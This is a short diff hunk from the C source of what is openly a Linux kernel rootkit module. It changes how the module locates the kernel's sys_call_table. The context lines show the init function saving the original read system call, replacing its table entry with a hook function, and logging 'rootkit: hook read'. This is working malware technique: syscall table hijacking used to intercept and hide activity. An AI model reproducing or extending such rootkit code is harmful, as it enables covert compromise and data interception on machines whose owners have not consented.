@@ -290,7 +290,7 @@ unsigned long lookup_by_name(const char *name){
 
 static int __init rootkit_init(void)
 {
-	__sys_call_table = (unsigned long *)lookup_by_name("sys_call_table");
+	__sys_call_table = (unsigned long *) kaddr_lookup_name("sys_call_table");
 	orig_read = (orig_read_t)__sys_call_table[__NR_read];
 	__sys_call_table[__NR_read] = (unsigned long)new_read;
 	printk("rootkit: hook read\n");*/
